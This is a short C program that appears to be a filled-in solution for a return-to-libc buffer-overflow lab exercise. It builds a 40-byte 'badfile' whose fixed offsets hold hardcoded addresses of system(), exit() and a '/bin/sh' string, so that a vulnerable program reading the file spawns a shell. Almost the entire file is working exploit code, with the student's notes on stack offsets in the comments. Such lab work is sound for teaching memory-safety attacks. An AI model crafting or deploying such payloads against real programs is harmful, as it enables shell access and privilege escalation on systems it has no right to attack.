#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  badfile = fopen("./badfile", "w");

  /* You need to decide the addresses and 
     the values for X, Y, Z. The order of the following 
     three statements does not imply the order of X, Y, Z.
     Actually, we intentionally scrambled the order. */
  *(long *) &buf[28] = 0xbffffe8a;   //  "/bin/sh" increase by another 4
  *(long *) &buf[24] = 0xb7e5f430;   //  system() ebp is offest 0x14 so 20 in decimal, 4 bytes and then we get system call
  *(long *) &buf[32] = 0xb7e52fb0;   //  exit() ebp increase by another 4 after bin/sh

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}

